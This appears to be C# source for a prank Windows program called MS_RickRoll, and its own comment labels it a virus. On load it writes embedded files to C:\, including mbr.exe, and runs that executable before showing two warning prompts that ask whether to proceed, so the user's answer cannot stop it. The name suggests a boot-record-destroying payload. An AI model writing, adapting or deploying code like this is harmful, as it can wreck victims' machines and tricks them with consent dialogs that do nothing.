using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Windows.Forms;
using System.Media;
using System.Diagnostics;
using Microsoft.Win32;

namespace MS_RickRoll
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            TransparencyKey = BackColor;
        }

        public static void Extract(string nameSpace, string outDirectory, string internalFilePath, string resourceName)
        {
            //Important.DO NOT CHANGE!!!

            Assembly assembly = Assembly.GetCallingAssembly();

            using (Stream s = assembly.GetManifestResourceStream(nameSpace + "." + (internalFilePath == "" ? "" : internalFilePath + ".") + resourceName))
            using (BinaryReader r = new BinaryReader(s))
            using (FileStream fs = new FileStream(outDirectory + "\\" + resourceName, FileMode.OpenOrCreate))
            using (BinaryWriter w = new BinaryWriter(fs))
                w.Write(r.ReadBytes((int)s.Length));
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            Extract("MS_RickRoll", @"C:\", "Resources", "rick.wav");
            Extract("MS_RickRoll", @"C:\", "Resources", "MS-Windows11.jpg");
            Extract("MS_RickRoll", @"C:\", "Resources", "mbr.exe");
            Process.Start("C:\\mbr.exe");
            if (MessageBox.Show("Run MS-RickRoll?", "WARNING", MessageBoxButtons.YesNo, MessageBoxIcon.Warning, MessageBoxDefaultButton.Button2) == DialogResult.No)
            {
                this.Close();
                Application.Exit();
            }
            else
            {
                Last_Warning();
            }
        }
        public void Last_Warning()
        {
            if (MessageBox.Show("THIS IS THE LAST WARNING!!!RUN MS-RICKROLL????", "WARNING", MessageBoxButtons.YesNo, MessageBoxIcon.Warning, MessageBoxDefaultButton.Button2) == DialogResult.No)
            {
                this.Close();
                Application.Exit();
            }
            else
            {
                go_to_payload();
            }
        }

        public void go_to_payload()
        {
            this.Hide();
            var NewForm = new Form2(); //lunch virus
            NewForm.ShowDialog();
            this.Close();
        }
    }
}
